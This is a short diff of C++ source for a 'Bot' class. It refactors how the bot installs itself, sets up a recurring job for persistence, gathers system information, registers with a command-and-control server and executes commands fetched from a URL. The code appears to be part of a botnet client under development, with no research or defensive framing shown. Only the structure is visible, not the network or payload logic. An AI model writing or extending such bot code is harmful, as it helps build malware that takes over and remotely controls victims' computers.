@@ -2,9 +2,10 @@
 #include <string>
 
 #include "command.hh"
+#include "installer.hh"
 #include "request.hh"
 #include "seed.hh"
-#include "system.hh"
+#include "util.hh"
 
 const std::string HASH_TYPE("SHA256");
 
@@ -15,8 +16,8 @@ class Bot {
         seed_ = std::make_unique<Seed>(seed_path);
     }
 
-    void Init();
-    bool IsInit();
+    void Install(std::string install_dir);
+    bool IsInstalled();
     void RegisterBot(const std::string& register_url);
     void ExecuteCommand(const std::string& command_url);
 
@@ -27,14 +28,15 @@ class Bot {
     void PrepareSysInfo_();
 };
 
-void Bot::Init() {
+void Bot::Install(std::string install_dir) {
     // Install files and components
-    install::InstallFiles();
+    Installer installer(install_dir);
+    installer.InstallFiles();
     seed_->InitSeed();
-    install::InitRecurringJob();
+    installer.InitRecurringJob();
 }
 
-bool Bot::IsInit() { return seed_->Exists(); }
+bool Bot::IsInstalled() { return seed_->Exists(); }
 
 void Bot::RegisterBot(const std::string& register_url) {
     // Register bot with C2 server
